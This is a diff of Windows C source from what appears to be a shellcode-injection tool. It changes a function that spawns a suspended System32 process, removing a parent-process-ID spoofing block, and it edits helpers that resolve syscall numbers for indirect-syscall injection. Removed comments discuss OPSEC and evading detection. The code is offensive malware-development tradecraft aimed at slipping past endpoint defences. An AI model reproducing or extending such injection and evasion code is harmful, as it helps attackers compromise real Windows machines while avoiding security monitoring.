@@ -3,92 +3,54 @@
 #pragma warning (disable:4996)
 
 BOOL CreateSuspendedProcess
-(IN LPCSTR lpProcessName,
- OUT DWORD* dwProcessId,
- IN HANDLE hParent,
- OUT HANDLE* hProcess,
- OUT HANDLE* hThread)
+(
+	IN LPCSTR ProcessName,
+	OUT DWORD* PID,
+	OUT HANDLE* hProcess,
+	OUT HANDLE* hThread
+)
+
 {
 
+	BOOL State = TRUE;
 
-	/*-----------------------------------------------------------------------------[Creating a Suspended Process]--------------------------------------------------*/
+	WCHAR lpPath[MAX_PATH * 2] = { 0 };
+	CHAR WnDr[MAX_PATH] = { 0 };
 
+	STARTUPINFO si = { 0 };
+	PROCESS_INFORMATION pi = { 0 };
 
-	CHAR lpPath[MAX_PATH * 2] = { 0 }; // This will store the full file path of notepad.exe
-	CHAR WnDr[MAX_PATH] = { 0 }; //Holds the windows system directory path "C:\\Windows"
-
-	SIZE_T                             sThreadAttList = NULL;
-	LPPROC_THREAD_ATTRIBUTE_LIST        pThreadAttList = NULL;
-
-	STARTUPINFOEXA siEx = { 0 }; // info about how a new process should appear when calling functions
-	PROCESS_INFORMATION pi = { 0 }; //receives info about newly created process
-
-	RtlSecureZeroMemory(&siEx, sizeof(STARTUPINFOEXA)); // zeros out memory
+	RtlSecureZeroMemory(&si, sizeof(STARTUPINFO));
 	RtlSecureZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
 
-	/* Getting Path to execute program... */
 	if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH))
 	{
-		WARN("GetEnvironmentVariableA Failed! With an Error: %d", GetLastError()); 
+		WARN("GetEnvironmentVariableA Failed! With an Error: %d", GetLastError());
 		return FALSE;
 	}
 
 
-	sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);
+	sprintf(lpPath, "%s\\System32\\%s", WnDr, ProcessName);
 
 
-	/*---------------------------------------------------------[PPID Spoofing]-----------------------------------------------------------------------*/
+	si.cb = sizeof(STARTUPINFO);
 
-
-	InitializeProcThreadAttributeList(NULL, 1, NULL, &sThreadAttList); // setup the amount of buffer required
-
-	pThreadAttList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sThreadAttList); // Allocate required memory
-	if (pThreadAttList == NULL) {
-		WARN("HeapAlloc Failed With Error : %d", GetLastError());
-		return FALSE;
-	}
-
-	if (!InitializeProcThreadAttributeList(pThreadAttList, 1, NULL, &sThreadAttList)) // Allocate the buffer
+	if (!CreateProcessA(NULL, lpPath, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
 	{
-		WARN("InitializeProcThreadAttributeList Failed With Error : %d", GetLastError());
-		return FALSE;
+		WARN("CreateProcessA Failed! With an Error: %lu", GetLastError());
+		State = FALSE;
 	}
 
+	OKAY("[0x%p] Created Process: %d", pi.hProcess, pi.dwProcessId);
 
-	if (!UpdateProcThreadAttribute(pThreadAttList, NULL, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL)) // Update the list
-	{
-		WARN("UpdateProcThreadAttribute Failed With Error : %d", GetLastError());
-		return FALSE;
-
-	}
-
-	/* Creating our suspended Process */
-	siEx.StartupInfo.cb = sizeof(STARTUPINFOEXA);
-	siEx.lpAttributeList = pThreadAttList;
-
-
-	if (!CreateProcessA(NULL, lpPath, NULL, NULL, FALSE, CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &siEx.StartupInfo, &pi)) // Create a notepad process with specific features.
-	{
-		WARN("CreateProcessA Failed! With an Error: %d", GetLastError());
-		return FALSE;
-	}
-
-	OKAY("Successfully Created a Suspended Process of %s", lpProcessName);
-
-
-	*dwProcessId = pi.dwProcessId;
+	*PID = pi.dwProcessId;
 	*hProcess = pi.hProcess;
 	*hThread = pi.hThread;
 
-
-	DeleteProcThreadAttributeList(pThreadAttList);
-
-	if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL)
-		return TRUE;
-
-	return FALSE;
+	return TRUE;
 
 }
+
 
 
 /*---------------------------------------------------[Externally Calling our Functions via ASM]-----------------------------------------------------------------------*/
@@ -97,21 +59,6 @@ BOOL CreateSuspendedProcess
 
 VOID IndirectPrelude(IN HMODULE mod, IN LPCSTR FuncName, OUT DWORD* FuncSSN, OUT PUINT_PTR FuncSys)
 {
-
-	/*
-
-		Something to note for this function, as of right now
-		this function will use GetProcAddress and we will also
-		use LoadLibrary in the next function.
-
-		In terms of OPSEC, this is malpractice, and should be switched
-		to a custom function.
-
-		For the sake of simplicity it will say like this, but in future
-		project, there will be a custom SSN retriver and PE module loader
-
-	*/
-
 
 	DWORD SyscallNumber = 0;
 
@@ -143,25 +90,16 @@ VOID IndirectPrelude(IN HMODULE mod, IN LPCSTR FuncName, OUT DWORD* FuncSSN, OUT
 		return;
 	}
 
-
-	/*
-
-		courtesy of Crr0ww for this function, however
-		in the future it will be better to not use these
-		when calling the Syscalls :)
-
-	*/
-
-
+	// courtesy of Crr0ww for this function
 }
 
 
 
 BOOL IndirectSyscallInjection
 (IN HANDLE hProcess,
- IN PBYTE pShellcode,
- IN SIZE_T sSizeOfShellcode,
- OUT PVOID* ppAddress)
+	IN PBYTE pShellcode,
+	IN SIZE_T sSizeOfShellcode,
+	OUT PVOID* ppAddress)
 
 {
 
